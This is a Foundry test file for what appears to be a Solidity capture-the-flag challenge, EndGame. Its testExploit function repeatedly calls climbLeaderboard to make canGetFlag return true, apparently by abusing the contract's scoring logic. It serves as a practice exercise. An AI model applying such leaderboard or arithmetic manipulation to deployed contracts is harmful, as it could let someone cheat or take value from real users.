// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/EndGame.sol";
import "../src/EndGameSolver.sol";

contract TestingEndGame is Test {
    EndGame victimContract;
    EndGameSolver solverContract;

    function setUp() public {
        victimContract = new EndGame();
        solverContract = new EndGameSolver(address(victimContract));
    }

    function testExploit() public {
        victimContract.joinedGame(address(this));

        victimContract.climbLeaderboard(12, address(this));
        for (uint256 i = 0; i < 100; i++) {
            victimContract.climbLeaderboard(1, address(this));
        }
        bool canGetFlagBool = victimContract.canGetFlag(address(this));

        console.log(canGetFlagBool);

        assert(canGetFlagBool == true);
    }
}
